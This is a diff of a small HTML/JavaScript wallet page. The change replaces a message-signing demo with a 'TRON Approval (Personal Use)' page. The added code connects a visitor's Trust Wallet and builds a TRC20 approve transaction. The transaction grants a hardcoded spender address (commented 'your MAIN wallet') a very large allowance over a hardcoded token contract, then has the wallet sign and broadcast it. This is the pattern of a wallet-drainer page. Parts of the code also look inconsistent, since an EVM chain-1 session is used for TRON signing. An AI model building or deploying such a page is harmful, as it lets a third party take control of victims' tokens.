@@ -1,98 +1,94 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>Trust Wallet TRON Personal DApp</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="utf-8" />
+  <title>TRON Approval – Personal dApp</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
 
-  <!-- WalletConnect Provider -->
+  <!-- WalletConnect -->
   <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.13.2/dist/index.umd.js"></script>
 
+  <!-- TronWeb -->
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
+
   <style>
-    body {
-      font-family: Arial;
-      background: #0f172a;
-      color: white;
-      padding: 30px;
-    }
-    button {
-      padding: 12px;
-      margin: 6px 0;
-      width: 100%;
-      font-weight: bold;
-    }
-    .box {
-      background: #020617;
-      padding: 15px;
-      margin-top: 15px;
-      border-radius: 6px;
-      word-break: break-all;
-    }
+    body { background:#0f172a; color:#fff; font-family:Arial; padding:20px }
+    button { padding:12px; width:100%; margin:8px 0; font-weight:bold }
+    .box { background:#020617; padding:12px; margin-top:12px; border-radius:6px }
   </style>
 </head>
+
 <body>
 
-<h2>🔐 Trust Wallet Personal dApp</h2>
+<h3>🔐 TRON Approval (Personal Use)</h3>
 
 <button onclick="connect()">Connect Trust Wallet</button>
-<button onclick="signMsg()">Sign Message</button>
+<button onclick="approve()">Approve Token</button>
 
 <div class="box">
   <div>Status: <span id="status">Disconnected</span></div>
-  <div>Address: <span id="address">-</span></div>
-  <div>Signature:</div>
-  <div id="sig">-</div>
+  <div>Wallet: <span id="addr">-</span></div>
+  <div>TxID: <span id="txid">-</span></div>
 </div>
 
 <script>
+const PROJECT_ID = "e75f4f36f23f8e6dc1f84a86fdbfa4ea";
+
+// 🔴 YOU MUST SET THESE EXPLICITLY
+const TOKEN_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC20
+const SPENDER = "TZC9E9PNULB87BKPhPmtrZBPRsu7QUPfTk";       // your MAIN wallet
+const AMOUNT = "1000000000000000000";              // token units
+
 let provider;
-let adapter;
-
-class TrustWalletTronAdapter {
-  constructor(provider) {
-    this.provider = provider;
-    this.address = null;
-  }
-
-  async connect() {
-    const accounts = await this.provider.request({
-      method: "eth_requestAccounts"
-    });
-    this.address = accounts[0];
-    return this.address;
-  }
-
-  async signMessage(msg) {
-    return await this.provider.request({
-      method: "personal_sign",
-      params: [msg, this.address]
-    });
-  }
-}
+let tronWeb;
+let walletAddress;
 
 async function connect() {
   provider = await window.EthereumProvider.init({
-    projectId: "e75f4f36f23f8e6dc1f84a86fdbfa4ea",
-    chains: [1],
+    projectId: PROJECT_ID,
+    chains: [1], // dummy EVM chain (session only)
     showQrModal: true
   });
 
   await provider.connect();
 
-  adapter = new TrustWalletTronAdapter(provider);
-  const addr = await adapter.connect();
+  // Create tronWeb instance (NO private key)
+  tronWeb = new TronWeb({
+    fullHost: "https://api.trongrid.io"
+  });
 
-  document.getElementById("status").innerText = "Connected";
-  document.getElementById("address").innerText = addr;
+  document.getElementById("status").innerText = "Connected (session)";
 }
 
-async function signMsg() {
-  if (!adapter) return alert("Connect wallet first");
+async function approve() {
+  if (!provider || !tronWeb) {
+    alert("Connect wallet first");
+    return;
+  }
 
-  const msg = "I approve this action for my personal dApp";
-  const sig = await adapter.signMessage(msg);
+  // Build approve TX
+  const contractHex = tronWeb.address.toHex(TOKEN_CONTRACT);
 
-  document.getElementById("sig").innerText = sig;
+  const { transaction } =
+    await tronWeb.transactionBuilder.triggerSmartContract(
+      contractHex,
+      "approve(address,uint256)",
+      {},
+      [
+        { type: "address", value: SPENDER },
+        { type: "uint256", value: AMOUNT }
+      ]
+    );
+
+  // 🔥 CUSTOM SIGNING (wallet-specific)
+  const signedTx = await provider.request({
+    method: "tron_signTransaction",
+    params: [transaction]
+  });
+
+  const result = await tronWeb.trx.sendRawTransaction(signedTx);
+
+  document.getElementById("txid").innerText = result.txid;
 }
 </script>
 
